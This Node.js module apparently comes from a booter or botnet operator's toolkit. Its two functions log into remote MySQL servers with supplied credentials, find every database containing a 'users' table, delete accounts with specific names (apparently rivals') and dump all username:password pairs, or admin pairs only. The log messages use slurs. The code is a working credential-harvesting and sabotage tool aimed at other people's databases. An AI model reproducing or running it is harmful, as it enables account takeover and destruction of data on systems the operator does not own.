const sql = require("mysql");

module.exports.getLogins = (host, username, password) => {
    return new Promise((resolve, reject) => {
        let response = false;
        let conn = sql.createConnection({
            host: host,
            user: username,
            password: password
        });
    
        conn.connect((err) => {
            if(err) return reject(JSON.stringify({
                error: true,
                message: "Invalid SQL credentials"
            }));
        });

        conn.query("SELECT * FROM information_schema.tables WHERE `TABLE_NAME`='users';", (err, tables) => {
            if(err) return reject(JSON.stringify({
                error: true,
                message: "Error when getting user table"
            }));
        
            for(let i = 0; i < tables.length; i++) {
                if(tables[i].TABLE_SCHEMA != "table_schema") {
                    let table = tables[i].TABLE_SCHEMA;

                    conn.query(`USE ${table};`, err => {
                        if(err) return reject(JSON.stringify({
                            error: true,
                            message: "Error when using database"
                        }));


                        // Plans to make this configurable :)
                        conn.query("DELETE FROM users WHERE username = 'Bermuda' OR username = 'BermudaSH' OR username = 'Triangle' OR username = 'SPED' OR username = 'SKID'", (err, res) => {
                            if(err && !response) {
                                response = true;
                                console.log(err)
                                console.log(`(sql): error removing the retard from ${host}`);
                            } else if(typeof res != "undefined") {
                                if(res.affectedRows == 0 && !response) {
                                    response= true;
                                    console.log(`(sql): error removing the retard from ${host}`);
                                } else {
                                    response = true;
                                    console.log(`(sql): removed retard (${res.affectedRows} ${(res.affectedRows >= 1 ? "time" : "times")})`);
                                }
                            } else {
                                if(!response) {
                                    console.log(4)
                                    response = true;
                                    console.log(`(sql): error removing the retard from ${host}`);
                                }
                            }
                        });

                        conn.query("SELECT username,password FROM `users`", (err, creds) => {
                            if(err) return reject(JSON.stringify({
                                error: true,
                                message: "Error when getting credentials"
                            }));

                            let unique = [];

                            for(let x = 0; x < creds.length; x++) {
                                let username = creds[x].username,
                                    password = creds[x].password;

                                if(!unique.includes(`${username}:${password}`)) {
                                    unique.push(`${username}:${password}`);
                                }

                                if(x == creds.length - 1) {
                                    conn.end();
                                    return resolve(JSON.stringify({
                                        error: false,
                                        message: `Succesfully gotten ${unique.length} unique credentials`,
                                        creds: unique
                                    }));
                                }
                            }
                        });
                    });
                }
            }
        });
        conn.on("error", () => {});
    });
}

module.exports.getAdmins = (host, username, password) => {
    return new Promise((resolve, reject) => {
        let conn = sql.createConnection({
            host: host,
            user: username,
            password: password
        });
    
        conn.connect((err) => {
            if(err) return reject(JSON.stringify({
                error: true,
                message: "Invalid SQL credentials"
            }));
        });

        conn.query("SELECT * FROM information_schema.tables WHERE `TABLE_NAME`='users';", (err, tables) => {
            if(err) return reject(JSON.stringify({
                error: true,
                message: "Error when getting user table"
            }));
        
            for(let i = 0; i < tables.length; i++) {
                if(tables[i].TABLE_SCHEMA != "table_schema") {
                    let table = tables[i].TABLE_SCHEMA;

                    conn.query(`USE ${table};`, err => {
                        if(err) return reject(JSON.stringify({
                            error: true,
                            message: "Error when using database"
                        }));

                        conn.query("DELETE FROM users WHERE username = 'Bermuda' OR username = 'idiot' OR username = 'cock' OR username = 'DONT' OR username = 'SKID'", (err, res) => {
                            if(err) {
                                console.log(`(sql): error removing the retard from ${host}`);
                            }
                            if(res.affectedRows != 0) {
                                console.log(`(sql): removed retard (${res.affectedRows} ${(res.affectedRows >= 1 ? "time" : "times")})`);
                            }
                            if(res.affectedRows == 0) {
                                console.log(`(sql): error removing the retard from ${host}`);
                            }
                        });

                        conn.query("SELECT username,password FROM `users` WHERE admin = '1'", (err, creds) => {
                            if(err) return reject(JSON.stringify({
                                error: true,
                                message: "Error when getting credentials"
                            }));

                            let unique = [];

                            for(let x = 0; x < creds.length; x++) {
                                let username = creds[x].username,
                                    password = creds[x].password;

                                if(!unique.includes(`${username}:${password}`)) {
                                    unique.push(`${username}:${password}`);
                                }

                                if(x == creds.length - 1) {
                                    conn.end();
                                    return resolve(JSON.stringify({
                                        error: false,
                                        message: `Succesfully gotten ${unique.length} unique credentials`,
                                        creds: unique
                                    }));
                                }
                            }
                        });
                    });
                }
            }
        });
        conn.on("error", () => {});
    });
}